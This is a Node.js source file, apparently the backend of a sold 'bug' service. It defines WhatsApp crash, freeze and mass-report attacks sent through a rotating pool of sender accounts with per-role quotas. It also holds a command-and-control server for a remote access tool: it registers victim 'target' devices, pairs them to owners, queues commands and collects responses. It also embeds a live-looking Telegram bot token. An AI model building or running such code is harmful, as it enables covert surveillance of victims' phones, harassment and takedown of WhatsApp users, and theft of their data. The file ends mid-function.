const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);
process.on('unhandledRejection', (reason, promise) => {
  console.log('Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.log('Uncaught Exception:', err);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};
process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const safeExit = process.exit;

// ⚠️ FIX: Dynamic import untuk Baileys (ES Module)
// Wrap semua code dalam async IIFE untuk menggunakan await import()
(async () => {
  const { default: makeWASocket, prepareWAMessageMedia, useMultiFileAuthState, DisconnectReason, generateWAMessage, getBuffer, generateWAMessageFromContent, proto, generateWAMessageContent, fetchLatestBaileysVersion, waUploadToServer, generateRandomMessageId, generateMessageTag, jidEncode, getUSyncDevices } = await import("@whiskeysockets/baileys");
  
  const express = require("express");
const readline = require("readline");
const crypto = require("crypto");
const app = express();
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const path = require('path');
const pino = require('pino');
const P = require('pino')
const vm = require('vm')
const os = require('os');
const WebSocket = require('ws');
const http = require('http');
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
let wsClients = {};
let chatList = [];
const CHAT_FILE = 'chat.json';
const bodyParser = require('body-parser');
const cors = require('cors');
const { Client } = require('ssh2');
const FormData = require("form-data");
const axios = require("axios");
const DB_PATH = "./database.json";
let activeKeys = {};
const KEY_FILE = path.join(__dirname, 'keyList.json');
const bugs = [
  { bug_id: "delay_INvisible_No_Spam_1", bug_name: "DELAY INVIS 1 [ NO SPAM ]" },    
  { bug_id: "delay_INvisible_No_Spam_2", bug_name: "DELAY INVIS 2 [ NO SPAM ]" },   
  { bug_id: "delay_INvisible_No_Spam_3", bug_name: "DELAY INVIS 3 [ NO SPAM ]" },    
  { bug_id: "delay_INvisible_No_Spam_4", bug_name: "DELAY INVIS 4 [ SPAM ]" },     
  { bug_id: "Blank_Ios", bug_name: "BLANK IOS [ NO SPAM ]" },  
  { bug_id: "stiker_blank", bug_name: "STIKER [ NO SPAM ]" },  
  { bug_id: "delay_freze", bug_name: "FREZE INVISIBLE [ MAYBE BUSSINES ]" },
  { bug_id: "Repp_Nomber", bug_name: "REPORT NOMBER [ REPP AMAN ]" },
  { bug_id: "Repp_Nomber_2", bug_name: "REPORT NOMBER [ REPP SPAM AMAN ]" },

];

// Update grup bugs list
const groupBugs = [
  { bug_id: "group_ban", bug_name: "BAN GROUP" },
  { bug_id: "group_blank", bug_name: "FREEZE BLANK" },
  { bug_id: "report_group", bug_name: "REPP GROUP" },
];

// ============================================================
// 🤖 SECAI - OPENAI GPT API ENDPOINT
// ============================================================

require("dotenv").config();

const OPENAI_API_KEY = process.env.OPENAI_API_KEY;

app.use(express.json({ limit: "1mb" }));

/* =========================================================
   OPENAI CHAT
========================================================= */

app.post("/api/chat", async (req, res) => {
    try {
        const messages = Array.isArray(req.body?.messages)
            ? req.body.messages
            : [];

        if (messages.length === 0) {
            return res.status(400).json({
                error: "Pesan kosong."
            });
        }

        if (!OPENAI_API_KEY) {
            return res.status(500).json({
                error: "OPENAI_API_KEY belum dikonfigurasi di server."
            });
        }

        // Batasi history agar request tidak terlalu besar
        const history = messages.slice(-30);

        console.log("=================================");
        console.log("[SECAI] Messages:", history.length);
        console.log(
            "[SECAI] Last:",
            history[history.length - 1]
        );

        const response = await axios.post(
            "https://api.openai.com/v1/chat/completions",
            {
                model: "gpt-5.6-luna",
                messages: history,
                max_completion_tokens: 2000
            },
            {
                headers: {
                    "Content-Type": "application/json",
                    "Authorization": `Bearer ${OPENAI_API_KEY}`
                },
                timeout: 120000
            }
        );

        const answer =
            response.data?.choices?.[0]?.message?.content;

        if (!answer) {
            console.log(
                "[SECAI] Response:",
                JSON.stringify(response.data, null, 2)
            );

            return res.status(502).json({
                error: "GPT tidak mengembalikan jawaban."
            });
        }

        console.log("[SECAI] SUCCESS");

        return res.status(200).json({
            answer: answer
        });

    } catch (error) {

        console.error("========== OPENAI ERROR ==========");

        console.error(
            "STATUS:",
            error.response?.status
        );

        console.error(
            "DATA:",
            JSON.stringify(
                error.response?.data,
                null,
                2
            )
        );

        console.error(
            "MESSAGE:",
            error.message
        );

        console.error(
            "==================================="
        );

        const status =
            error.response?.status || 500;

        const openaiError =
            error.response?.data?.error;

        return res.status(status).json({
            error:
                openaiError?.message ||
                error.message ||
                "Gagal menghubungi OpenAI."
        });
    }
});


/* =========================================================
   HEALTH CHECK
========================================================= */

app.get("/", (req, res) => {
    res.json({
        status: "online",
        service: "SecAI",
        ai: "OpenAI"
    });
});


let cncActive = true;
let vpsList = [];
let vpsConnections = {}
const VPS_FILE = 'vps.json';
let sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
fs.watchFile("keyList.json", () => {
  console.log("[📂] keyList.json changed, reloading...");
  sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
});

// ============================================================
// 🌐 GLOBAL SENDER — Helper Functions (FIX)
// ============================================================

// Fungsi untuk menghitung global sender aktif
function countActiveGlobalSenders() {
  return Object.keys(globalConnections).length;
}

// Fungsi untuk mendapatkan global sender secara round-robin
function getActiveGlobalSender() {
  const numbers = Object.keys(globalConnections);
  if (numbers.length === 0) return null;
  
  // Round-robin: pilih secara bergiliran
  const index = lastUsedGlobalSenderIndex % numbers.length;
  lastUsedGlobalSenderIndex = (lastUsedGlobalSenderIndex + 1) % numbers.length;
  
  const selectedNumber = numbers[index];
  console.log(`[🌐 GLOBAL] Menggunakan sender ${censorNumber(selectedNumber)} (${index + 1}/${numbers.length})`);
  
  return globalConnections[selectedNumber];
}

// Fungsi untuk masking nomor WhatsApp
function censorNumber(number) {
  const str = String(number).replace(/\D/g, '');
  if (str.length <= 4) return str;
  return str.slice(0, 2) + '****' + str.slice(-2);
}

// Fungsi untuk menyimpan daftar global sender
function saveGlobalSenders(data) {
  fs.writeFileSync(GLOBAL_SENDER_FILE, JSON.stringify(data, null, 2));
}

// Fungsi untuk memuat daftar global sender
function loadGlobalSenders() {
  if (!fs.existsSync(GLOBAL_SENDER_FILE)) {
    fs.writeFileSync(GLOBAL_SENDER_FILE, JSON.stringify([]));
    return [];
  }
  try {
    return JSON.parse(fs.readFileSync(GLOBAL_SENDER_FILE));
  } catch {
    return [];
  }
}

// ============================================================
// 🌐 GLOBAL SENDER SYSTEM
// ============================================================
const globalConnections = {}; // { number: sock }
const GLOBAL_SENDER_FILE = path.join(__dirname, 'globalSenders.json');

// TAMBAHKAN INI - Variabel untuk round-robin
let lastUsedGlobalSenderIndex = 0;
let globalSenderCallCount = 0; // Untuk tracking penggunaan

// ============================================================
// 📊 GLOBAL SENDER DAILY LIMIT
// member: 2×  |  reseller: 3×  |  admin: 4×  |  owner: 7×  |  tk: 999×
// ============================================================
const GLOBAL_SENDER_DAILY_LIMIT = {
  member: 2,
  reseller: 3,
  admin: 4,
  owner: 7,
  tk: 999,  // 999 kali (hampir unlimited)
};

const globalSenderUsage = {}; // { username: { date: "YYYY-MM-DD", count: N } }

function getTodayDate() {
  return new Date().toISOString().slice(0, 10); // "YYYY-MM-DD"
}

function checkGlobalSenderLimit(username, role) {
  const limit = GLOBAL_SENDER_DAILY_LIMIT[role];
  
  // Jika role tidak ditemukan
  if (limit === undefined) {
    return { 
      allowed: false, 
      reason: `❌ Role '${role}' tidak memiliki akses global sender.` 
    };
  }
  
  // Jika limit 999 (tk) → unlimited
  if (limit === 999) {
    return { 
      allowed: true, 
      remaining: '∞',
      message: `✅ Role ${role} unlimited (999x/hari)`
    };
  }

  const today = getTodayDate();
  
  // Inisialisasi jika belum ada
  if (!globalSenderUsage[username] || globalSenderUsage[username].date !== today) {
    globalSenderUsage[username] = { date: today, count: 0 };
  }

  const used = globalSenderUsage[username].count;
  
  // Cek apakah sudah melebihi limit
  if (used >= limit) {
    return {
      allowed: false,
      reason: `⚠️ *LIMIT HABIS!*\n━━━━━━━━━━━━━━━━━━━━\n📊 Role: *${role.toUpperCase()}*\n🎯 Limit: ${limit}×/hari\n✅ Terpakai: ${used}×\n❌ Sisa: 0\n━━━━━━━━━━━━━━━━━━━━\nCoba lagi besok!`,
      used,
      limit,
    };
  }

  const remaining = limit - used;
  return { 
    allowed: true, 
    remaining: remaining,
    used,
    limit,
    message: `✅ Sisa limit hari ini: ${remaining}/${limit}`
  };
}

function incrementGlobalSenderUsage(username, role) {
  // Jika limit 999 (tk) → tidak perlu track
  if (GLOBAL_SENDER_DAILY_LIMIT[role] === 999) return;
  
  const today = getTodayDate();
  if (!globalSenderUsage[username] || globalSenderUsage[username].date !== today) {
    globalSenderUsage[username] = { date: today, count: 0 };
  }
  
  globalSenderUsage[username].count++;
  
  const limit = GLOBAL_SENDER_DAILY_LIMIT[role];
  const used = globalSenderUsage[username].count;
  const remaining = limit - used;
  
  console.log(`[🌐 GLOBAL LIMIT] ${username} (${role}): ${used}/${limit} | Sisa: ${remaining}`);
}

// Fungsi untuk mendapatkan sisa limit (bisa dipanggil dari API)
function getRemainingGlobalLimit(username, role) {
  const limit = GLOBAL_SENDER_DAILY_LIMIT[role];
  if (limit === undefined) return 0;
  if (limit === 999) return 999;
  
  const today = getTodayDate();
  if (!globalSenderUsage[username] || globalSenderUsage[username].date !== today) {
    return limit;
  }
  
  return limit - globalSenderUsage[username].count;
}

function getTodayDate() {
  return new Date().toISOString().slice(0, 10); // "YYYY-MM-DD"
}

function checkGlobalSenderLimit(username, role) {
  const limit = GLOBAL_SENDER_DAILY_LIMIT[role];
  if (limit === undefined) {
    return { allowed: false, reason: `Role '${role}' tidak memiliki akses global sender.` };
  }
  if (limit === Infinity) return { allowed: true, remaining: Infinity };

  const today = getTodayDate();
  if (!globalSenderUsage[username] || globalSenderUsage[username].date !== today) {
    globalSenderUsage[username] = { date: today, count: 0 };
  }

  const used = globalSenderUsage[username].count;
  if (used >= limit) {
    return {
      allowed: false,
      reason: `Limit harian global sender habis. Role *${role}* hanya ${limit}×/hari. Coba lagi besok.`,
      used,
      limit,
    };
  }

  return { allowed: true, remaining: limit - used, used, limit };
}

function incrementGlobalSenderUsage(username, role) {
  if (GLOBAL_SENDER_DAILY_LIMIT[role] === Infinity) return; // tk no limit, no need to track
  const today = getTodayDate();
  if (!globalSenderUsage[username] || globalSenderUsage[username].date !== today) {
    globalSenderUsage[username] = { date: today, count: 0 };
  }
  globalSenderUsage[username].count++;
}
// ============================================================

if (fs.existsSync(CHAT_FILE)) {
  chatList = JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8'));
}

function saveChat() {
  fs.writeFileSync(CHAT_FILE, JSON.stringify(chatList, null, 2));
}

function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '')
    .replace(/[\r\n]/g, ' ')
    .slice(0, 250);
}

const TOKEN = "8044072285:AAHzDixOzmDBuCxt-Xl8NrNEs2biK-KMDY4";
const bot = new TelegramBot(TOKEN, {
  polling: {
    interval: 2000,
    autoStart: true,
    params: { timeout: 10 }
  }
});

// ── Fix polling error agar bot tidak crash ──
bot.on('polling_error', (err) => {
  const msg = err?.message || String(err);
  if (msg.includes('ETELEGRAM') || msg.includes('409')) {
    console.log('[⚠️ POLLING] Bot conflict (409) — pastikan tidak ada instance lain yang jalan!');
  } else if (msg.includes('EFATAL') || msg.includes('ECONNREFUSED')) {
    console.log('[⚠️ POLLING] Koneksi gagal, retry otomatis...');
  } else {
    console.log('[⚠️ POLLING ERROR]', msg);
  }
});

bot.on('error', (err) => {
  console.log('[⚠️ BOT ERROR]', err?.message || err);
});

const ID_GROUP = [
    -1003797666719
];

const ID_GROUP_UTAMA = [
    -1003531578440
];

function sendToGroups(text, options = {}) {
    for (const groupid of ID_GROUP) {
        bot.sendMessage(groupid, text, options).catch(err => {
            console.error(`Gagal kirim ke ${groupid}:`, err.response?.body || err.message);
        });
    }
}

function sendToGroupsUtama(text, options = {}) {
    for (const groupid of ID_GROUP_UTAMA) {
        bot.sendMessage(groupid, text, options).catch(err => {
            console.error(`Gagal kirim ke ${groupid}:`, err.response?.body || err.message);
        });
    }
}

const OWNER_ID = 7604882007;
  
wss.on('connection', function (ws, req) {
  let username;

  ws.on('message', function (msg) {
    try {
      const data = JSON.parse(msg);

        if (data.type === 'sessionCheck') {
  const sessionList = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
  const user = sessionList.find(e => e.sessionKey === data.key);

  if (!user) {
    ws.send(JSON.stringify({
      type: "forceLogout",
      reason: "Invalid key"
    }));
    return ws.close();
  }

  if (user.androidId !== data.androidId) {
    ws.send(JSON.stringify({
      type: "forceLogout",
      reason: "Another device has logged in"
    }));
    return ws.close();
  }
}

      if (data.type === 'validate') {
        const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key)
        const validId = session.find(e => e.androidId === data.androidId)
          
        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

        ws.send(JSON.stringify({
          type: "myInfo",
          valid: true,
          username: session.username,
          androidId: session.androidId,
          role: session.role || "member"
        }));

            const interval = setInterval(() => {
            const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key)
        const validId = session.find(e => e.androidId === data.androidId)
          
        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

            }, 10000);
      }
      if (data.type === 'auth') {
        username = getUserByKey(data.key);
         console.log(username)
        if (!username) return ws.close();
        wsClients[username] = ws;

const list = chatList
  .filter(m => m.from === username || m.to === username)
  .map(m => (m.from === username ? m.to : m.from));

  ws.send(JSON.stringify({
    type: "chatList",
    users: [...new Set(list)],
  }));
      }

      if (data.type === 'chat') {
        const to = data.to;
        const message = sanitize(data.message);
if (!username || !to || !message || message.length > 250) return;

        const chat = {
          from: username,
          to,
          message,
          time: new Date().toISOString()
        };
        chatList.push(chat);
        saveChat();

        ws.send(JSON.stringify({ type: 'chat', message: { ...chat, fromMe: true } }));

        if (wsClients[to]) {
          wsClients[to].send(JSON.stringify({
            type: 'chat',
            message: { ...chat, fromMe: false }
          }));
        }
      }

      if (data.type === 'getMessages') {
        const withUser = data.with;
        const messages = chatList
          .filter(m =>
            (m.from === username && m.to === withUser) ||
            (m.from === withUser && m.to === username)
          )
          .map(m => ({
            ...m,
            fromMe: m.from === username
          }));

        ws.send(JSON.stringify({ type: 'messages', with: withUser, messages }));
      }
    } catch (e) {
      console.error("WS error:", e.message);
    }
  });

  ws.on('close', () => {
    if (username && wsClients[username]) {
      delete wsClients[username];
    }
  });
});

const wsPort = 2014;
server.listen(wsPort, () => {
  console.log(`🟣 Server running on http://localhost:${wsPort}`);
});

const PORT = 2014;

app.use(express.urlencoded({ extended: false }));
app.use(express.json());

const rateLimitMap = {};

function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();

  if (!rateLimitMap[key]) {
    rateLimitMap[key] = [];
  }

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 2) {
    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 20 request per detik.",
    });
  }

  next();
}

app.use(rateLimiter);

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

if (fs.existsSync(KEY_FILE)) {
  try {
    const rawData = fs.readFileSync(KEY_FILE, 'utf8');
    const parsed = JSON.parse(rawData);

    for (const user of parsed) {
      if (user.sessionKey && user.username && user.lastLogin) {
        const created = new Date(user.lastLogin).getTime();
        const expires = created + 10 * 60 * 1000;

        activeKeys[user.sessionKey] = {
          username: user.username,
          created,
          expires,
        };
      }
    }

    console.log("✅ activeKeys loaded from keyList.json.");
  } catch (err) {
    console.error("❌ Failed to load keyList.json:", err.message);
  }
}

function connectToAllVPS() {
  if (!cncActive) return;
  console.log("🔄 Connecting to all VPS servers...");

  for (const vps of vpsList) {
    if (vpsConnections[vps.host]) {
      console.log(`✅ Already connected to ${vps.host}`);
      continue;
    }

    const conn = new Client();

    conn.on('ready', () => {
      if (!cncActive) { conn.end(); return; }
      console.log(`✅ Connected to VPS: ${vps.host}`);
      vpsConnections[vps.host] = conn;

      conn.on('close', () => {
        console.log(`🔌 Disconnected: ${vps.host}`);
        delete vpsConnections[vps.host];
        if (cncActive) {
          console.log(`🔁 Reconnecting to ${vps.host} in 5s...`);
          setTimeout(connectToAllVPS, 5000);
        }
      });
    });

    conn.on('error', (err) => {
      console.log(`❌ Failed to connect to ${vps.host}: ${err.message}`);
    });

    conn.connect({
      host: vps.host,
      username: vps.username,
      password: vps.password,
      readyTimeout: 5000
    });
  }
}

function disconnectAllVPS() {
  console.log("🛑 Disconnecting all VPS connections...");
  cncActive = false;
  for (const host in vpsConnections) {
    vpsConnections[host].end();
    delete vpsConnections[host];
  }
}

if (fs.existsSync(VPS_FILE)) {
  vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
  console.log("📥 VPS list loaded.");
    connectToAllVPS();
}

fs.watch(VPS_FILE, () => {
  try {
    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
    console.log("🔄 VPS list updated.");
      connectToAllVPS();
  } catch (e) {
    console.error("❌ Failed to update VPS list:", e.message);
  }
});

function getUserByKey(key) {
  const keyInfo = activeKeys[key];
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  return user ? keyInfo.username : null;
}

// ============================================================
// 📱 RAT (Remote Access Tool) - Device Monitoring System
// ============================================================

// ── RAT Files & Constants ──────────────────────────────────
const RAT_TARGETS = './rat_targets.json';
const RAT_LIVE    = {};  // in-memory live frames

// ============================================================
// 📁 RAT FILE HELPERS — FUNGSI YANG DITAMBAHKAN
// ============================================================

// Definisikan konstanta untuk file RAT
const TARGETS_FILE = './rat_targets.json';
const COMMANDS_FILE = './rat_commands.json';
const RESPONSES_FILE = './rat_responses.json';
const NOTIF_FILE = './rat_notifs.json';

// Fungsi untuk membaca data dari file JSON
function readData(filePath) {
    try {
        if (!fs.existsSync(filePath)) {
            // Buat file kosong jika belum ada
            fs.writeFileSync(filePath, JSON.stringify([]));
            return [];
        }
        const content = fs.readFileSync(filePath, 'utf8');
        return JSON.parse(content);
    } catch (err) {
        console.error(`[READ ERROR] ${filePath}:`, err.message);
        return [];
    }
}

// Fungsi untuk menyimpan data ke file JSON
function saveData(filePath, data) {
    try {
        fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
        return true;
    } catch (err) {
        console.error(`[SAVE ERROR] ${filePath}:`, err.message);
        return false;
    }
}

// ── Fungsi readRat & saveRat (untuk kompatibilitas) ──────
function readRat(f) {
  try { return JSON.parse(fs.existsSync(f) ? fs.readFileSync(f,'utf8')||'[]' : '[]'); } 
  catch { return []; }
}
function saveRat(f,d) { 
  try { fs.writeFileSync(f, JSON.stringify(d,null,2)); } 
  catch(_) {} 
}

// ── Auto-clean offline targets (> 5 menit) ────────────────
const cleanOfflineTargets = () => {
    let targets = readData(TARGETS_FILE);
    const now = new Date();
    let hasChanges = false;
    
    const filteredTargets = targets.filter(target => {
        const lastSeen = new Date(target.lastSeen);
        const diffMinutes = (now - lastSeen) / (1000 * 60);
        
        if (diffMinutes > 5) {
            console.log(`[AUTO CLEAN] Menghapus target offline: ${target.id} (${target.model}) - Offline selama ${diffMinutes.toFixed(1)} menit`);
            hasChanges = true;
            
            let notifs = readData(NOTIF_FILE);
            notifs = notifs.filter(n => n.targetId !== target.id);
            saveData(NOTIF_FILE, notifs);
            
            let commands = readData(COMMANDS_FILE);
            commands = commands.filter(c => c.targetId !== target.id);
            saveData(COMMANDS_FILE, commands);
            
            let responses = readData(RESPONSES_FILE);
            responses = responses.filter(r => r.targetId !== target.id);
            saveData(RESPONSES_FILE, responses);
            
            return false;
        }
        return true;
    });
    
    if (hasChanges) {
        saveData(TARGETS_FILE, filteredTargets);
        console.log(`[AUTO CLEAN] Target aktif tersisa: ${filteredTargets.length}`);
    }
};

// ── Jalankan auto-clean setiap 30 detik ────────────────────
setInterval(() => {
    cleanOfflineTargets();
}, 30000);

// ════════════════════════════════════════════════════════════════════════════
// RAT CORE ENDPOINTS (device target berkomunikasi via port ini)
// ════════════════════════════════════════════════════════════════════════════

function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  console.log("[🔑 GEN] Key baru dibuat:", key);
  return key;
}

// ✅ Tambahkan ini
function genPairId() {
  return crypto.randomBytes(8).toString('hex').toUpperCase();
}

function isExpired(user) {
  const expired = new Date(user.expiredDate) < new Date();
  console.log(`[⏳ EXP] ${user.username} expired:`, expired);
  return expired;
}

// ── Heartbeat (setiap 2 detik dari device) ────────────────
app.post('/api/heartbeat/:id', (req, res) => {
    const targetId = req.params.id;
    let targets = readData(TARGETS_FILE);
    const index = targets.findIndex(t => t.id === targetId);

    if (index !== -1) {
        targets[index].lastSeen = new Date();
        targets[index].status = "Online";
        saveData(TARGETS_FILE, targets);
    } else {
        console.log(`[HEARTBEAT] Target ${targetId} mengirim heartbeat tapi tidak terdaftar`);
    }
    
    res.status(200).send('1'); 
});

// ── Register Target ────────────────────────────────────────
app.post('/api/register-target', (req, res) => {
    const deviceData = req.body;
    let targets = readData(TARGETS_FILE);
    const index = targets.findIndex(t => t.id === deviceData.id);

    if (index !== -1) {
        targets[index] = { ...targets[index], ...deviceData, lastSeen: new Date(), status: "Online" };
    } else {
        targets.push({ ...deviceData, lastSeen: new Date(), status: "Online" });
    }
    saveData(TARGETS_FILE, targets);
    console.log(`[REGISTER] Target terdaftar: ${deviceData.id} (${deviceData.model})`);
    res.json({ status: 'ok' });
});

// ── List Targets ────────────────────────────────────────────
app.get('/api/list-targets', (req, res) => {
    let targets = readData(TARGETS_FILE);
    
    const now = new Date();
    targets = targets.map(target => {
        const lastSeen = new Date(target.lastSeen);
        const diffSeconds = (now - lastSeen) / 1000;
        target.status = diffSeconds > 10 ? "Offline" : "Online";
        return target;
    });
    
    saveData(TARGETS_FILE, targets);
    res.json(targets);
});

// ── RAT: Ambil pairId milik user ──────────────────────────
app.get("/rat/pairid", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });
  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === keyInfo.username);
  if (idx === -1) return res.json({ valid: false, message: "User not found" });
  if (!db[idx].pairId) {
    db[idx].pairId = genPairId();
    saveDatabase(db);
    console.log('[PAIRID] Generated for: ' + db[idx].username + ' → ' + db[idx].pairId);
  }
  console.log('[PAIRID] Serving pairId for: ' + db[idx].username + ' → ' + db[idx].pairId);
  res.json({ valid: true, pairId: db[idx].pairId, username: db[idx].username, role: db[idx].role });
});

// ── RAT: Pair Target ────────────────────────────────────────
app.post('/api/pair-target', (req, res) => {
  const { pairId, deviceId, model, battery } = req.body;
  if (!pairId || !deviceId) return res.status(400).json({ error: 'pairId dan deviceId wajib' });
  
  let db = loadDatabase();
  
  // AUTO-FIX: generate pairId untuk semua user yang belum punya
  let dbChanged = false;
  for (let i = 0; i < db.length; i++) {
    if (!db[i].pairId) {
      db[i].pairId = genPairId();
      dbChanged = true;
      console.log('[AUTO-PAIR] Generated pairId for user: ' + db[i].username + ' → ' + db[i].pairId);
    }
  }
  if (dbChanged) saveDatabase(db);
  
  const ownerIdx = db.findIndex(u => 
    u.pairId && u.pairId.toUpperCase() === pairId.toUpperCase()
  );
  
  console.log('[PAIR-DEBUG] Looking for pairId: ' + pairId + ' | Found at index: ' + ownerIdx);
  if (ownerIdx >= 0) {
    console.log('[PAIR-DEBUG] Owner found: ' + db[ownerIdx].username + ' | Their pairId: ' + db[ownerIdx].pairId);
  } else {
    console.log('[PAIR-DEBUG] All pairIds in DB: ' + db.map(u => u.username + ':' + u.pairId).join(', '));
  }
  
  if (ownerIdx === -1) return res.status(404).json({ error: 'PairID tidak valid', hint: 'Cek pairId di Device Dashboard' });
  const owner = db[ownerIdx];
  if (!owner.devices) owner.devices = [];
  if (!owner.devices.includes(deviceId)) {
    owner.devices.push(deviceId);
    db[ownerIdx] = owner;
    saveDatabase(db);
  }
  let t = readRat(RAT_TARGETS);
  const i = t.findIndex(x => x.id === deviceId);
  const dev = { id: deviceId, model: model || 'Unknown', battery: battery || '?', owner: owner.username, status: 'Online', lastSeen: new Date() };
  if (i !== -1) t[i] = { ...t[i], ...dev };
  else          t.push(dev);
  saveRat(RAT_TARGETS, t);
  console.log('[PAIR] ' + deviceId + ' → ' + owner.username);
  res.json({ status: 'paired', ownerUsername: owner.username });
});

// ── RAT: Grant Member Access ───────────────────────────────
app.post("/rat/grant-member", (req, res) => {
  const { ownerKey, memberUsername, deviceIds, allDevices } = req.body;
  const keyInfo = activeKeys[ownerKey];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid key" });
  const db = loadDatabase();
  const owner = db.find(u => u.username === keyInfo.username);
  if (!owner || owner.role !== "owner") return res.status(403).json({ valid: false, message: "Only owner can grant" });
  const member = db.find(u => u.username === memberUsername);
  if (!member) return res.status(404).json({ valid: false, message: "Member not found" });
  if (!member.ratPerms) member.ratPerms = {};
  member.ratPerms[owner.username] = {
    approved: true,
    allDevices: allDevices === true,
    deviceIds: Array.isArray(deviceIds) ? deviceIds : [],
  };
  saveDatabase(db);
  console.log(`[GRANT] ${owner.username} → ${memberUsername} | allDevices:${allDevices} | ids:${deviceIds}`);
  res.json({ valid: true, message: `${memberUsername} berhasil diberi akses` });
});

// ── RAT: Revoke Member Access ──────────────────────────────
app.post("/rat/revoke-member", (req, res) => {
  const { ownerKey, memberUsername } = req.body;
  const keyInfo = activeKeys[ownerKey];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid key" });
  const db = loadDatabase();
  const owner = db.find(u => u.username === keyInfo.username);
  if (!owner || owner.role !== "owner") return res.status(403).json({ valid: false, message: "Only owner" });
  const member = db.find(u => u.username === memberUsername);
  if (member && member.ratPerms) {
    delete member.ratPerms[owner.username];
    saveDatabase(db);
  }
  res.json({ valid: true, message: `Akses ${memberUsername} dicabut` });
});

// ── RAT: My Devices (cek permission & ambil device) ───────
app.get("/rat/my-devices", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(404).json({ valid: false });

  const targets = readRat(RAT_TARGETS);

  if (user.role === "owner" || user.role === "dev") {
    const owned = targets.filter(t => t.owner === user.username);
    return res.json({ valid: true, pairId: user.pairId, role: user.role, devices: owned });
  }

  const perms = loadDevicePerms();
  const userPerm = perms[user.username.toLowerCase()];

  let allowedDevices = [];

  if (userPerm && userPerm.approved) {
    if (userPerm.allDevices) {
      allowedDevices = targets;
    } else if (Array.isArray(userPerm.devices) && userPerm.devices.length > 0) {
      allowedDevices = targets.filter(t => userPerm.devices.includes(t.id));
    }
  } else {
    for (const owner of db.filter(u => u.role === "owner" || u.role === "dev")) {
      const perm = owner.ratPerms?.[user.username];
      if (!perm || !perm.approved) continue;
      const ownerDevices = targets.filter(t => t.owner === owner.username);
      if (perm.allDevices) {
        allowedDevices = allowedDevices.concat(ownerDevices);
      } else {
        allowedDevices = allowedDevices.concat(
          ownerDevices.filter(d => (perm.deviceIds || []).includes(d.id))
        );
      }
    }
  }

  res.json({ valid: true, pairId: null, role: user.role, devices: allowedDevices });
});

// ── RAT: Send Command ──────────────────────────────────────
app.post('/api/send-command', (req, res) => {
  const { id, command, extra } = req.body;
  let cmds = readRat('./rat_commands.json');
  cmds = cmds.filter(c => c.targetId !== id);
  cmds.push({ targetId: id, command, extra: extra || '', timestamp: new Date() });
  saveRat('./rat_commands.json', cmds);
  console.log('[CMD] ' + id + ': ' + command);
  res.json({ status: 'queued' });
});

// ── RAT: Get Command ───────────────────────────────────────
app.get('/api/get-command/:id', (req, res) => {
  const id = req.params.id;
  let cmds = readRat('./rat_commands.json');
  const i = cmds.findIndex(c => c.targetId === id);
  if (i !== -1) {
    const cmd = cmds[i];
    cmds.splice(i, 1);
    saveRat('./rat_commands.json', cmds);
    return res.json(cmd);
  }
  res.status(204).send();
});

// ── RAT: Post Response ─────────────────────────────────────
app.post('/api/post-response/:id', (req, res) => {
  const id = req.params.id;
  const { cmd, data } = req.body;
  let resps = readRat('./rat_responses.json');
  const i = resps.findIndex(r => r.targetId === id);
  const nr = { targetId: id, cmd, data, timestamp: new Date() };
  if (i !== -1) resps[i] = nr; else resps.push(nr);
  saveRat('./rat_responses.json', resps);
